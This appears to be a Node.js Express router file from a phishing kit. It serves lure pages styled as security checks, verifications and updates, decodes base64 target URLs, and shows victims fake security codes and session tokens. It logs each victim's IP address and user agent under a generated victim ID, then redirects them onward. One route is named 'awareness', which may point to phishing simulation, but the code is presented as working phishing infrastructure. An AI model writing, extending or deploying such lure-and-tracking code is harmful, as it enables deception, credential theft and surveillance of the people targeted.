const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');

// Render phishing pages
router.get('/security-check/:encodedUrl', (req, res) => {
    renderPhishingPage(req, res, 'security-check');
});

router.get('/verification/:encodedUrl', (req, res) => {
    renderPhishingPage(req, res, 'verification');
});

router.get('/update/:encodedUrl', (req, res) => {
    renderPhishingPage(req, res, 'update');
});

router.get('/awareness/:encodedUrl', (req, res) => {
    renderPhishingPage(req, res, 'awareness');
});

// Loading page
router.get('/loading', (req, res) => {
    res.render('loading', {
        victimId: req.query.id || generateId(),
        redirectUrl: req.query.redirect || 'https://google.com'
    });
});

// Helper function to render phishing pages
function renderPhishingPage(req, res, page) {
    try {
        const encodedUrl = req.params.encodedUrl;
        const targetUrl = Buffer.from(encodedUrl, 'base64').toString('utf8');
        const victimId = req.query.id || generateId();
        
        // Security code and tokens
        const securityCode = generateSecurityCode();
        const sessionToken = generateSessionToken();
        
        // Log the access
        logPageAccess(victimId, page, req.ip, req.get('User-Agent'));
        
        res.render(page, {
            victimId: victimId,
            targetUrl: targetUrl,
            securityCode: securityCode,
            sessionToken: sessionToken,
            timestamp: Date.now()
        });
        
    } catch (error) {
        console.error('Page render error:', error);
        res.status(500).send('Internal Server Error');
    }
}

// Generate unique IDs
function generateId() {
    return 'v' + Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
}

function generateSecurityCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function generateSessionToken() {
    return Buffer.from(Date.now() + Math.random().toString(36)).toString('base64');
}

function logPageAccess(victimId, page, ip, userAgent) {
    const logEntry = {
        victimId: victimId,
        page: page,
        ip: ip,
        userAgent: userAgent,
        timestamp: new Date().toISOString()
    };
    
    // In production, save to database
    console.log('Page access:', logEntry);
}

module.exports = router;
